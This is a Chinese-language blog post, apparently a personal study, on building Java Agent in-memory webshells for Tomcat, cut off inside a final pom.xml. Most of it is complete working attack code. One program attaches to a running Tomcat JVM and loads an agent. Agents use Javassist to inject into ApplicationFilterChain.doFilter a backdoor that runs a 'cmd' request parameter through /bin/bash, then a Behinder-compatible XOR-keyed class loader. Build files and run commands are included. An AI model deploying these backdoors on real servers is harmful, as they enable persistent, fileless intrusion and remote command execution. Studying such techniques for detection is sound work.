---
title: Java Agent内存马研究学习
date: 2022-09-21 20:28:02
tags: [Java,代码审计]
categories: java
---

​	根据Java Agent内存马演变历史进行研究学习：

第一阶段：

- 1. 上传inject.jar到服务器用来枚举jvm并进行植入；
  1. 上传agent.jar到服务器用来承载webshell功能；
  2. 执行系统命令java -jar inject.jar。

第二阶段：

- 1. 上传agent.jar到服务器用来承载webshell功能；
  2. 冰蝎服务端调用Java API将agent.jar植入自身进程完成注入。

第三阶段：

- 内存马防检测
- 无文件落地agent植入技术

第四阶段：

- 《论如何优雅的注入Java Agent内存马》



# 0x01 Java Agent概述

​	在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，可以让我们动态修改已加载或者未加载的类，包括类的属性和方法。

​	而Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。

Java Agent 支持两种加载方式对java程序进行动态修改，分别为：

1.  `premain` 方法，在启动时进行加载 。
2. `agentmain` 方法，在启动后进行加载 。

详细信息可以看官方文档：https://docs.oracle.com/en/java/javase/18/docs/api/java.instrument/java/lang/instrument/package-summary.html

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/b231cf505b9ddf95b7fa3a982b757bf6.png)

# 0x02 Java Agent内存马初步实现

​	因为内存马是针对已经在运行的Web应用设计的，因此我主要学习研究方向是**启动后加载agent实现内存马**。

​	因此主要学习如何将一个agent加载进jvm里、学习agent在被加载后需要实施的行为（将恶意代码动态写进类里）。

## 1.加载agent方法

#### VirtualMachine

`com.sun.tools.attach.VirtualMachine`这个类提供`attach`、`detach`、`list`、`loadAgent`等方法用来实现附加到JAVA虚拟机、从虚拟机分离、列出当前JAVA虚拟机列表、加载Agent等操作。

**Attach** ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，以此让当前的JAVA程序远程连接到JVM上。

```java
VirtualMachine vm = VirtualMachine.attach(v.id());
```

**loadAgent**：在我们的JAVA程序附加到指定的JVM后，可以使用该方法向JVM加载一个agent，同时会给该agent传递一个Instrumentation实例，该实例可以用来在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用`ClassFileTransformer`接口中提供的方法进行处理。

**List：**返回一个 `VirtualMachineDescriptor`元素列表，可以展示当前计算机环境中所有JAVA虚拟机，我们可以用来选择对应的虚拟机进行ATTACH。

**Detach**：从 JVM 上面解除agent。

**注入流程总结：**首先使用VirtualMachine 类的list方法，列出当前环境的所有JVM，之后 attach 到一个运行中的 java 进程上，再然后使用loadAgent(agentJarPath) 来将agent 的 jar包注入到对应的进程.

#### Inject.jar

```java
import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

/**
 * @Author: reader-l
 * @Date: 2022/9/4 下午11:17
 */
public class insertAgentMain {
    public static void main(String[] args) {
        String path = "AgentInject-1.0-SNAPSHOT-jar-with-dependencies.jar";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        //遍历当前所有的JVM
        for (VirtualMachineDescriptor v : list) {
            System.out.println(v.displayName());
            //寻找我们要Attach的JVM及类名
            if (v.displayName().contains("org.apache.catalina.startup.Bootstrap")) {
                System.out.println(v.id());
                VirtualMachine attach = null;
                try {
                    //根据JVM的pid进行attach
                    attach = VirtualMachine.attach(v.id());
                    //将我们设计的agent加载进指定JVM
                    attach.loadAgent(path);

                    attach.detach();
                } catch (AttachNotSupportedException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (AgentLoadException e) {
                    e.printStackTrace();
                } catch (AgentInitializationException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}

```

**MANIFEST.MF**

```
Manifest-Version: 1.0
Main-Class: insertAgentMain
```

**pom.xml**

实现将agent附加到jvm中，必须使用到VirtualMachine类，但是JVM启动的时候并不会默认加载tools.jar包（也就是`com.sun.tools.attach`），所以要嘛一开始就把tools.jar包打包进去，要嘛就是利用URLClassLoader加载目标机器上的tools.jar。

下面的POM.xml就是一开始就将tools.jar包打包进去。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>insertAgent</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>com.sun.tools.attach</groupId>
            <artifactId>MyTools</artifactId>
            <version>1.0</version>
            <scope>system</scope>
            <systemPath>${pom.basedir}/lib/GenericAgentTools.jar</systemPath>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <configuration>
                    <!-- get all project dependencies -->
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>

                    <!-- MainClass in mainfest make a executable jar -->
                    <archive>
                        <manifestEntries>
                            <Project-name>${project.name}</Project-name>
                            <Project-version>${project.version}</Project-version>
                            <Main-Class>insertAgentMain</Main-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                    <descriptors>
                        <descriptor>src/assembly/package.xml</descriptor>
                    </descriptors>
                </configuration>
                <executions>
                    <!-- bind to the packaging phase -->
                    <execution>
                        <id>make-assembly</id>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>

        </plugins>
    </build>
</project>
```

**Package.xml**

```xml
<assembly xmlns="http://maven.apache.org/ASSEMBLY/2.1.1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/ASSEMBLY/2.1.1 https://maven.apache.org/xsd/assembly-2.1.1.xsd">

    <id>jar-with-dependencies</id>
    <formats>
        <format>jar</format>
    </formats>
    <includeBaseDirectory>false</includeBaseDirectory>
    <dependencySets>
        <dependencySet>
            <outputDirectory>/</outputDirectory>
            <useProjectArtifact>true</useProjectArtifact>
            <unpack>true</unpack>
            <scope>runtime</scope>
        </dependencySet>
        <dependencySet>
            <outputDirectory>/</outputDirectory>
            <unpack>true</unpack>
            <scope>system</scope>
        </dependencySet>
    </dependencySets>
</assembly>
```



## 2.编写agent

实现启动后加载Agent，需要编写实现agentmain函数：

```
public static void agentmain(String agentArgs, Instrumentation inst)
public static void agentmain(String agentArgs)
```

​	同时我们需要在MANIFEST.MF设置：`Agent-Class`参数。

#### Instrumentation

​	我们在实现agentmain的时候，我们除了获取agentArgs参数，我们还可以获取Instrumentation实例。这个类是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

#### addTransformer

​	该方法是用来注册添加Transformer，Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，

```
addTransformer(ClassFileTransformer transformer)
addTransformer(ClassFileTransformer transformer, boolean canRetransform)

```

​	所以我可以通过编写`ClassFileTransformer `接口的实现类来注册自定义转换器。这样我指定的目标类被夹在的时候，会进入到自定义的Transformer中的transform函数进行拦截。

​	在transform函数里面可以用Javaassist ，一个用来 处理 Java 字节码的类库。

#### getAllLoadedClasses

getAllLoadedClasses 方法能列出所有已加载的 Class，可以通过遍历 Class 数组来寻找我们需要重定义的 class

#### retransformClasses

retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果目标类已经被加载的话，可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果

#### redefineClasses

除了用自定义Transformer对目标类进行重新拦截加载，还可以使用redefineClasses直接对已经修改的字节码文件进行重新定义。

#### agent.jar（一）-retransformClasses

**agentmain：**

```JAVA
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;


public class AgentInject {
    public static final String className = "org.apace.catalina.core.ApplicationFilterChain";
    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        inst.addTransformer(new Transformer(),true);
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class clazz : loadedClasses){
            System.out.println(clazz.getName());
            if (clazz.getName().equals(className)){
                System.out.println(className);;
                inst.retransformClasses(new Class[]{clazz});
            }


        }
    }
}

```

**Transformer：**

```JAVA
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

    String CLASSNAME = "org.apace.catalina.core.ApplicationFilterChain";

    public byte[] transform(ClassLoader classLoader, String className, Class<?> c, ProtectionDomain pd ,byte[] classFileBytes){
        if (className.equals(CLASSNAME)){
            ClassPool classPool = ClassPool.getDefault();

            String code = "    String cmd = request.getParameter(\"cmd\");\n" +
                    "    if(cmd != null){\n" +
                    "        java.lang.Runtime runtime = java.lang.Runtime.getRuntime();\n" +
                    "        Process resultprocess = runtime.exec(new String[]{\"/bin/bash\",\"-c\",cmd});\n" +
                    "        InputStream inputStream = resultprocess.getInputStream();\n" +
                    "        BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);\n" +
                    "        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                    "        int read;\n" +
                    "        while ((read = bufferedInputStream.read()) > 0 ){\n" +
                    "            byteArrayOutputStream.write(read);\n" +
                    "        }\n" +
                    "        java.io.PrintWriter writer = response.getWriter();\n" +
                    "        writer.println(new String(byteArrayOutputStream.toByteArray()));\n" +
                    "    }";
            try{
                CtClass ctClass = classPool.get(CLASSNAME);
                CtMethod doFilter = ctClass.getDeclaredMethod("doFilter");
                doFilter.insertBefore(code);
                byte[] bytes = ctClass.toBytecode();

            }catch (Exception e){
                e.printStackTrace();
            }

        }
        return new byte[0];
    }

}
```

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/8ec03fe69c1cea71b001491b53b5dc9c.png)

**MANIFEST.MF**

```
Manifest-Version: 1.0
Agent-Class: AgentInject
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

**pom.xml**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>AgentInject</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.29.1-GA</version>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <configuration>
                    <!-- get all project dependencies -->
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>

                    <!-- MainClass in mainfest make a executable jar -->
                    <archive>

                        <manifestEntries>
                            <Project-name>${project.name}</Project-name>
                            <Project-version>${project.version}</Project-version>
                            <Agent-Class>AgentInject</Agent-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                </configuration>
                <executions>
                    <!-- bind to the packaging phase -->
                    <execution>
                        <id>make-assembly</id>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>

        </plugins>
    </build>
</project>
```

利用maven进行编译打包，会得到AgentInject-1.0-SNAPSHOT-jar-with-dependencies.jar 携带完整依赖的jar包。

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/4b60ead4d3471ca4fab5c5cd56810b23.png)



#### agent.jar（二）-redefineClasses

**agentmain:**

```java
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

/**
 * @Author: reader-l
 * @Date: 2022/9/2 下午3:50
 */
public class AgentInject {
    public static final String className = "org.apace.catalina.core.ApplicationFilterChain";
    public static final String methodName= "doFilter";
    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class clazz : loadedClasses){
            if (clazz.getName().equals(className)){
                ClassPool classPool = ClassPool.getDefault();
                try {
                    CtClass ctClass = classPool.get(clazz.getName());
                    CtMethod declaredMethod = ctClass.getDeclaredMethod(methodName);
                    String code = "    String cmd = request.getParameter(\"cmd\");\n" +
                            "    if(cmd != null){\n" +
                            "        java.lang.Runtime runtime = java.lang.Runtime.getRuntime();\n" +
                            "        Process resultprocess = runtime.exec(new String[]{\"/bin/bash\",\"-c\",cmd});\n" +
                            "        InputStream inputStream = resultprocess.getInputStream();\n" +
                            "        BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);\n" +
                            "        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                            "        int read;\n" +
                            "        while ((read = bufferedInputStream.read()) > 0 ){\n" +
                            "            byteArrayOutputStream.write(read);\n" +
                            "        }\n" +
                            "        java.io.PrintWriter writer = response.getWriter();\n" +
                            "        writer.println(new String(byteArrayOutputStream.toByteArray()));\n" +
                            "    }";
                    declaredMethod.insertBefore(code);
                    byte[] bytes = ctClass.toBytecode();
                    ClassDefinition classDefinition = new ClassDefinition(clazz, bytes);
                    inst.redefineClasses(new ClassDefinition[]{classDefinition});
                    ctClass.detach();
                } catch (NotFoundException e) {
                    e.printStackTrace();
                } catch (CannotCompileException | IOException e) {
                    e.printStackTrace();
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }

            }
        }
    }
}

```

## 3.演示demo

直接执行`java -jar insertAgent-1.0-SNAPSHOT-jar-with-dependencies.jar`

虽然有报错，但是都正常执行了。

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/ab5185cc3033958ae477dd32b464611b.png)

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/b89086a5223131feec40bb3ba51ccbd8.png)
# 0x03 Java Agent内存马-inject、agent二合一

直接尝试注入冰蝎4.0.5。同时针对tools.jar，直接利用目标机器上的jdk环境的tools.jar包。

**Attach：**

```java

import java.io.File;
import java.lang.reflect.Method;

public class Attach {
    public static String CLASS_NAME = "org.apache.catalina.startup.Bootstrap";
    public static void main(String[] args) throws Exception {
        String property = System.getProperty("user.dir");
        System.out.println(property);
        String agentPath = property+"/AgentInject-1.0-SNAPSHOT-jar-with-dependencies.jar";
        String toolspath = System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar";
        System.out.println(toolspath);
        File file = new File(toolspath);
        java.net.URL url = file.toURI().toURL();
        java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
        Class<?> VirtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
        Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
        java.lang.reflect.Method listMethod = VirtualMachine.getMethod("list");
        java.util.List<Object> list = (java.util.List<Object>)listMethod.invoke(VirtualMachine);
        for ( int i = 0 ; i < list.size() ; i++ ){
            Object o = list.get(i);
            java.lang.reflect.Method displayNameMethod = VirtualMachineDescriptor.getMethod("displayName");
            String display = (String) displayNameMethod.invoke(o);
            System.out.println(display);
            if (display.contains(CLASS_NAME)){
                java.lang.reflect.Method getId = VirtualMachineDescriptor.getDeclaredMethod("id");
                String jvmid = (String) getId.invoke(o);
                System.out.println(jvmid);
                Method attach = VirtualMachine.getDeclaredMethod("attach", new Class[]{java.lang.String.class});
                Object vm =  attach.invoke(o, new Object[]{jvmid});
                java.lang.reflect.Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", new Class[]{java.lang.String.class});
                loadAgent.invoke(vm, new Object[]{agentPath});
                java.lang.reflect.Method detach = VirtualMachine.getDeclaredMethod("detach");
                detach.invoke(vm);
                System.out.println("Agent.jar Inject success!!");
                break;
            }
        }
    }
}
```

**Agent：**

```java
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agent {
    public static final String CLASS_NAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String METHODNAME = "doFilter";
    public static void agentmain(String args, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, InterruptedException {
        Class<?>[] allLoadedClasses = inst.getAllLoadedClasses();
        for (Class<?> clazz : allLoadedClasses){
            if (clazz.getName().equals(CLASS_NAME)){
                ClassPool classPool = ClassPool.getDefault();
                ClassClassPath classClassPath = new ClassClassPath(clazz);
                classPool.insertClassPath(classClassPath);
                try {
                    CtClass ctClass = classPool.get(clazz.getName());
                    if (ctClass.isFrozen()){
                        //解决冻结
                        ctClass.defrost();
                    }
                    CtMethod declaredMethod = ctClass.getDeclaredMethod(METHODNAME);
                    String code =
                            "            java.util.Map obj = new java.util.HashMap();\n" +
                                    "            javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest)request;\n" +
                                    "            obj.put(\"request\",httpServletRequest);\n" +
                                    "            obj.put(\"response\",response);\n" +
                                    "            obj.put(\"session\",httpServletRequest.getSession());\n" +
                                    "            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();\n"+
                                    "            if (httpServletRequest.getMethod().equals(\"POST\")){\n" +
                                    "                byte[] bytes = new byte[1024];\n" +
                                    "                int read = httpServletRequest.getInputStream().read(bytes);\n" +
                                    "                while ( read > 0 ){\n" +
                                    "                    byte[] data = java.util.Arrays.copyOfRange(bytes, 0, read);\n" +
                                    "                    byteArrayOutputStream.write(data);\n" +
                                    "                    read = httpServletRequest.getInputStream().read(bytes);\n" +
                                    "                }\n" +

                                    "                try {\n" +
                                    "                    sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();\n" +
                                    "                    byte[] decodebs = base64Decoder.decodeBuffer(new String(byteArrayOutputStream.toByteArray()));\n" +
                                    "                    String key=\"e45e329feb5d925b\";\n" +
                                    "                    for (int i = 0; i < decodebs.length; i++) {\n" +
                                    "                        decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));\n" +
                                    "                    }\n" +

                                    "ClassLoader loader=this.getClass().getClassLoader();\n"+
                                    "java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n" +
                                    "defineMethod.setAccessible(true);\n" +
                                    "java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n" +
                                    "constructor.setAccessible(true);\n" +
                                    "java.lang.ClassLoader cl = (java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n" +
                                    "java.lang.Class  c = (java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(decodebs),null});\n" +
                                    "c.newInstance().equals(obj);"+
                                    "                } catch (NoSuchMethodException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.reflect.InvocationTargetException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.IllegalAccessException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.InstantiationException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                }\n" +
                                    "            }";
                    declaredMethod.insertBefore(code);
                    byte[] bytes = ctClass.toBytecode();
                    ClassDefinition classDefinition = new ClassDefinition(clazz, bytes);
                    inst.redefineClasses(new ClassDefinition[]{classDefinition});
                } catch (NotFoundException | CannotCompileException | IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }
}

```

**MANIFEST.MF**

```
Manifest-Version: 1.0
Main-Class: Attach
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

**Pom.xml**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>AgentInject</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.27.0-GA</version>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <artifactId>maven-assembly-plugin</artifactId>
                <configuration>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                    <archive>
                        <manifest>
                            <mainClass>Attach</mainClass>
                        </manifest>
                        <manifestFile>src/main/java/META-INF/MANIFEST.MF</manifestFile>
                    </archive>
                </configuration>
                <executions>
                    <execution>
                        <id>make-assembly</id>
                        <phase>package</phase>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

`java -jar AgentInject-1.0-SNAPSHOT-jar-with-dependencies.jar 1`

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/d88740ca68074ac05d28f0661c54aa24.png)

成功连接

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/beeb09f14a180a6ee49442d18f7bf167.png)

# 0x04 编写代码遇到的问题

关于`class is Frozen`的报错，

https://blog.csdn.net/weixin_34417635/article/details/92682091

解决：

```java
                    if (ctClass.isFrozen()){
                        //解决冻结
                        ctClass.defrost();
                    }
```

关于`javassist no found such xxxx class`的问题：

解决：

```java
                ClassClassPath classClassPath = new ClassClassPath(clazz);//clazz是我们要修改字节码的目标类。
                classPool.insertClassPath(classClassPath);
```

# 0x05 关于tools.jar的问题

​	因为java Agent不可避免的需要调用`com.sun.tools.attach.VirtualMachine`类，这个tools.jar在JVM启动的时候并不会默认加载。具体的解决方法在0x01-1点和0x03点都有提到：分别是提前将一个tools.jar包给打包进项目、利用ClassLoader加载目标机器jdk环境library中的tools.jar。

​	我个人是推荐提前将一个tools.jar给打包进去项目里面。

我这里是直接将哥斯拉已经集成好的`GenericAgentTools.jar`拿来使用：

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/870a5ee3c20036a8b046b508789b0247.png)

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/13c33761f9480ed189ca2492280ef6cc.png)

# 0x06 最终项目结构

**Attach：**

```java
import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class Attach {
    public static String CLASS_NAME = "org.apache.catalina.startup.Bootstrap";
    public static void main(String[] args){

        String property = System.getProperty("user.dir");
        String agentPath = property+"/AgentInject-1.0-SNAPSHOT-jar-with-dependencies.jar";
        try {
            Class.forName("sun.tools.attach.HotSpotAttachProvider");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        System.out.println(agentPath);
        for (VirtualMachineDescriptor virtualMachineDescriptor : list){
//            System.out.println(virtualMachineDescriptor.displayName());
            if (virtualMachineDescriptor.displayName().contains(CLASS_NAME)){
                String id = virtualMachineDescriptor.id();
                try {
                    System.out.println(id);
                    VirtualMachine attach = VirtualMachine.attach(id);
                    attach.loadAgent(agentPath);
                    attach.detach();
                } catch (AttachNotSupportedException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (AgentLoadException e) {
                    e.printStackTrace();
                } catch (AgentInitializationException e) {
                    e.printStackTrace();
                }
                System.out.println("success");
            }
        }
    }
}
```

**Agent：**

```java
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agent {
    public static final String CLASS_NAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String METHODNAME = "doFilter";
    public static void agentmain(String args, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, InterruptedException {
        Class<?>[] allLoadedClasses = inst.getAllLoadedClasses();
        for (Class<?> clazz : allLoadedClasses){
            System.out.println(clazz.getName());
            if (clazz.getName().equals(CLASS_NAME)){
                System.out.println(clazz.getName());
                ClassPool classPool = ClassPool.getDefault();
                ClassClassPath classClassPath = new ClassClassPath(clazz);
                classPool.insertClassPath(classClassPath);
                try {
                    CtClass ctClass = classPool.get(clazz.getName());
                    if (ctClass.isFrozen()){
                        //解决冻结
                        ctClass.defrost();
                    }
                    CtMethod declaredMethod = ctClass.getDeclaredMethod(METHODNAME);
                    String code =
                            "            java.util.Map obj = new java.util.HashMap();\n" +
                                    "            javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest)request;\n" +
                                    "            obj.put(\"request\",httpServletRequest);\n" +
                                    "            obj.put(\"response\",response);\n" +
                                    "            obj.put(\"session\",httpServletRequest.getSession());\n" +
                                    "            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();\n"+
                                    "            if (httpServletRequest.getMethod().equals(\"POST\")){\n" +
                                    "                byte[] bytes = new byte[1024];\n" +
                                    "                int read = httpServletRequest.getInputStream().read(bytes);\n" +
                                    "                while ( read > 0 ){\n" +
                                    "                    byte[] data = java.util.Arrays.copyOfRange(bytes, 0, read);\n" +
                                    "                    byteArrayOutputStream.write(data);\n" +
                                    "                    read = httpServletRequest.getInputStream().read(bytes);\n" +
                                    "                }\n" +

                                    "                try {\n" +
                                    "                    sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();\n" +
                                    "                    byte[] decodebs = base64Decoder.decodeBuffer(new String(byteArrayOutputStream.toByteArray()));\n" +
                                    "                    String key=\"e45e329feb5d925b\";\n" +
                                    "                    for (int i = 0; i < decodebs.length; i++) {\n" +
                                    "                        decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));\n" +
                                    "                    }\n" +

                                    "ClassLoader loader=this.getClass().getClassLoader();\n"+
                                    "java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n" +
                                    "defineMethod.setAccessible(true);\n" +
                                    "java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n" +
                                    "constructor.setAccessible(true);\n" +
                                    "java.lang.ClassLoader cl = (java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n" +
                                    "java.lang.Class  c = (java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(decodebs),null});\n" +
                                    "c.newInstance().equals(obj);"+
                                    "                } catch (NoSuchMethodException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.reflect.InvocationTargetException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.IllegalAccessException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                } catch (java.lang.InstantiationException e) {\n" +
                                    "                    e.printStackTrace();\n" +
                                    "                }\n" +
                                    "            }";
                    declaredMethod.insertBefore(code);
                    byte[] bytes = ctClass.toBytecode();
                    ClassDefinition classDefinition = new ClassDefinition(clazz, bytes);
                    inst.redefineClasses(new ClassDefinition[]{classDefinition});
                } catch (NotFoundException | CannotCompileException | IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }
}

```

**MANIFEST.MF**

```
Manifest-Version: 1.0
Main-Class: Attach
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

**Pom.xml**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>AgentInject</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.27.0-GA</version>
        </dependency>
        <dependency>
            <groupId>com.sun.tools.attach</groupId>
            <artifactId>tools</artifactId>
            <scope>system</scope>
            <version>${java.version}</version>
            <systemPath>${pom.basedir}/lib/GenericAgentTools.jar</systemPath>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <artifactId>maven-assembly-plugin</artifactId>
                <configuration>

                    <archive>
                        <manifestFile>src/main/java/META-INF/MANIFEST.MF</manifestFile>
                    </archive>
                    <descriptors>
                        <descriptor>src/assembly/package.xml</descriptor>
                    </descriptors>
                </configuration>
                <executions>
                    <execution>
                        <id>make-assembly</id>
                        <phase>package</phase>
                    </execution>
